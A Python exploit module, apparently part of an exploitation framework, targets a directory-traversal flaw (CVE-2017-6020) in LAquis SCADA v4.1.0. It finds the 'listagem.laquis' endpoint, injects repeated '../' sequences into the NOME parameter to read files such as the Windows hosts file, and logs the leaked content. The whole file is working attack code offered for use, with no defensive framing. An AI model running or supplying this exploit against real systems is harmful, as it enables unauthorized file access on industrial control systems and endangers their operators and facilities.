import requests
from utils.logger import setup_logger

logger = setup_logger()

def exploit(target: str, port: int = 1234, file_path: str = "windows/system32/drivers/etc/hosts", depth: int = 10):
    """
    Exploit Title: LAquis SCADA v4.1.0 - Directory Traversal
    CVE: CVE-2017-6020
    Author: James Fitts
    Original Exploit: https://ics-cert.us-cert.gov/advisories/ICSA-17-082-01
    """

    base_url = f"http://{target}:{port}"
    traversal = "../" * depth
    target_file = file_path.replace("/", "\\")
    found = False

    try:
        # Step 1: Discover listagem.laquis endpoint
        logger.info(f"[*] Connecting to {base_url}/")
        r = requests.get(base_url + "/", timeout=5)
        urls = [u for u in r.text.split('"') if "listagem" in u]
        if not urls:
            logger.warning("[-] No listagem.laquis endpoint found.")
            return False

        for listagem in urls:
            logger.info(f"[*] Trying listagem endpoint: {listagem}")
            # Step 2: Check if endpoint is valid
            res = requests.get(f"{base_url}/{listagem}", timeout=5)
            if "<title>Listagem</title>" in res.text:
                found = True
                break

        if not found:
            logger.warning("[-] Valid listagem.laquis endpoint not found.")
            return False

        # Step 3: Attempt directory traversal via NOME param
        exploit_url = f"{base_url}/{listagem}"
        injection_path = f"{traversal}{target_file}"
        payload = exploit_url.replace("NOME=", f"NOME={injection_path}")

        logger.info(f"[*] Exploit attempt using NOME={injection_path}")
        res = requests.get(payload, timeout=5)

        if res.status_code == 200 and "localhost" in res.text.lower():
            logger.success("[+] Directory traversal successful! 'hosts' file content leaked.")
            logger.info(f"[+] Snippet:\n{res.text[:500]}")
            return True
        else:
            logger.warning("[-] Exploit attempt failed or file is empty.")

    except Exception as e:
        logger.error(f"[!] LAquis exploit error: {e}")

    return False
